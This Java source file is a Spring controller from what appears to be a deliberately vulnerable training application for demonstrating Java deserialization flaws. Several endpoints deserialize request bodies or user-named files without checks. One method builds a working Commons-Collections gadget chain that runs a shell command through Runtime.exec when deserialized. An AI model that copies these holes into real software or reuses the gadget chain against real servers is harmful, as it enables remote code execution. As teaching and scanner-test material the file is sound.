package com.csec.goat.controller;

import com.csec.goat.util.astpiastclass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.apache.log4j.Logger;
import org.springframework.ui.ModelMap;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;
import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

/**
 * Created by cryin
 * Date:2018/3/25
 * Copyright by Code Security Group.
 * Description:反序列化漏洞演示示例
 */
@RestController
@RequestMapping(path = "/object")
public class DeserializationController {
    private static Logger logger  =  Logger.getLogger(DeserializationController.class);
    @RequestMapping(value="/postJson.html",method= RequestMethod.POST)
    public String DeserialIndex(ModelMap modelMap, HttpServletRequest request) {
        String result="";
        try {
            BufferedReader reader = new BufferedReader(new InputStreamReader(request.getInputStream()));
            StringBuilder sb=new StringBuilder();
            String line;
            while ((line=reader.readLine()) != null){
                sb.append(line);
            }

            if(logger.isDebugEnabled()){
                logger.debug("postJson request body: "+sb.toString());
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return result;
    }
    @RequestMapping(value="postStream.html",method= RequestMethod.POST)
    public void Deserialstream(ModelMap modelMap, HttpServletRequest request) {
        try {
            //读取输入流,并转换对象
            InputStream in = request.getInputStream();
            ObjectInputStream ois = new ObjectInputStream(in);
            //恢复对象
            ois.readObject();
            ois.close();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
    }
    @RequestMapping(value="postfile.html",method= RequestMethod.POST)
    public void Deserialfile(ModelMap modelMap, HttpServletRequest request) {
        try
        {
            String name=request.getParameter("name");
            //读取object文件,并转换对象
            FileInputStream fis = new FileInputStream(name);
            ObjectInputStream ois = new ObjectInputStream(fis);
            //恢复对象
            ois.readObject();
            ois.close();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
    }

    @RequestMapping(value="writefile.html",method= RequestMethod.POST)
    public void writeObject(ModelMap modelMap, HttpServletRequest request) {
        //创建一个包含对象进行反序列化信息的”objectexp”数据文件
        String name=request.getParameter("name");
        FileOutputStream fos = null;
        try {
            fos = new FileOutputStream(name);
            ObjectOutputStream os = new ObjectOutputStream(fos);
            Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer("exec", new Class[] { String.class }, new Object[] { "open /Applications/Calculator.app" }) };
            Transformer transformerChain = new ChainedTransformer(transformers);

            Map innermap = new HashMap();
            innermap.put("value", "value");
            Map outmap = TransformedMap.decorate(innermap, null, transformerChain);
            //通过反射获得AnnotationInvocationHandler类对象
            Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            //通过反射获得cls的构造函数
            Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
            //这里需要设置Accessible为true，否则序列化失败
            ctor.setAccessible(true);
            //通过newInstance()方法实例化对象
            Object myObj = ctor.newInstance(Retention.class, outmap);
            //writeObject()方法将myObj对象写入object文件
            os.writeObject(myObj);
            os.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InstantiationException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        }
    }

    @RequestMapping(value="writeiastobject.html",method= RequestMethod.GET)
    public String writeIastObject(ModelMap modelMap, HttpServletRequest request) throws IOException {
        //创建一个包含对象进行反序列化信息的”objectexp”数据文件
        astpiastclass myObj = new astpiastclass(9527,"astpiast");
        //创建一个包含对象进行反序列化信息的”object”数据文件
        ObjectOutputStream os;
        try {
            FileOutputStream fos = new FileOutputStream("/Users/cryin/code/tcscan/data/java/object.db");
            //writeObject()方法将myObj对象写入object文件
            os = new ObjectOutputStream(fos);
            os.writeObject(myObj);
            os.close();

        }
        catch (FileNotFoundException e) {
            e.printStackTrace();
        }
        catch (IOException e) {
            e.printStackTrace();
        }
        return "writeiastobject ok!";

    }


}
